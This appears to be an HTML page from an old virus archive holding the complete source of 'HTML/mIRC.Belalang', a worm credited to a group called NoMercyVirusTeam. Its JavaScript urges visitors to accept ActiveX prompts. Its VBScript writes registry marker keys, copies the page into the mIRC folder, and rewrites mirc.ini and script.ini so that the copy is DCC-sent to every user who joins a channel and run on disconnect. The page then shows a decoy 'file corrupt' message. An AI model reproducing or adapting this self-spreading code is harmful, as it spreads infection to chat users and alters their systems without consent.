================================================================================
<br>This file has been exported by unregistered version of CHMUnpacker.
<br>This message is not appear on files exported by a registered version of CHMUnpacker.
<br>You can buy CHMUnpacker at <a href="http://www.bobsoft.com/chmu">http://www.bobsoft.com/chmu</a>
<br>================================================================================
<br>
<br>
<br>
<br>HTML.Belalang by Foxz by  


<META NAME=HTML/MIRC CONTENT=Belalang>
<META NAME=Author CONTENT=foxz of NoMercyVirusTeam>
<html><body>

<SCRIPT language=JavaScript>
<!--
	var userAgent=navigator.appName;
	var userVer=navigator.appVersion;
	var agentInfo=userAgent.substring(0, 1);
	var agentVer=userVer.substring(0, 1);
       if(agentInfo == "M"){
if  (agentVer >="4"){
alert("IF Your Active-X ask to you, and you want \nto continue load this page answer YES!")
}
}else {
alert("This page was generate by IE4, and only for IE4")
self.close()
history.go(-1)
}
//-->
</SCRIPT>

<SCRIPT language=VBScript>
<!-- HTML/MIRC.Belalang AKA Hopper done by foxz of NoMercyVirusTeam -->
<!-- this will not run on Netscape -->
<!--
On Error Resume Next 
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\belalang\Name", "HTML/mIRC.Belalang"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\belalang\Author", "foxz of NVT"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\belalang\Team", "TheNoMercyVirusTeam"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\belalang\URL", "http://sourceofkaos.com/homes/nomercy"

Set FSO = CreateObject("Scripting.FileSystemObject")
Set foxz = FSO.CreateTextFile("c:\mirc\bookmark.html", True)
Set Around = document.body.createTextRange
	foxz.WriteLine "<META NAME=HTML/MIRC CONTENT=Belalang>"
	foxz.WriteLine "<META NAME=Author CONTENT=foxz of NoMercyVirusTeam>"
	foxz.Write("<html><body>" + Chr(13) + Chr(10))
	foxz.WriteLine Around.htmlText
	foxz.WriteLine("<body><html>"+ Chr(13) + Chr(10) + "file corrupt" + Chr(13) + Chr(10) + "</body></html>")
	foxz.Write(FileContents)
	foxz.close()

Set mircini = FSO.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
      mircini.WriteLine "[rfiles]                                       "
      mircini.WriteLine "n100=script.ini                                "
      mircini.Close

Set scrini = FSO.CreateTextFile("c:\mirc\script.ini", True)
      scrini.WriteLine "[script]                                       "
      scrini.WriteLine "n0; HTML/mIRC Belalang.A                        "
      scrini.WriteLine "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } "
      scrini.WriteLine "n2=  /dcc send $nick c:\mirc\bookmark.html     "
      scrini.WriteLine "n3=}                                           "
      scrini.WriteLine "n4=                                            "
      scrini.WriteLine "n5=on 1:DISCONNECT:/run c:\mirc\bookmark.html     "
      scrini.WriteLine "n6=on 1:QUIT:#:/msg $chan bye2            "
      scrini.Close
</SCRIPT>
<body><html>
file corrupt
</body></html>
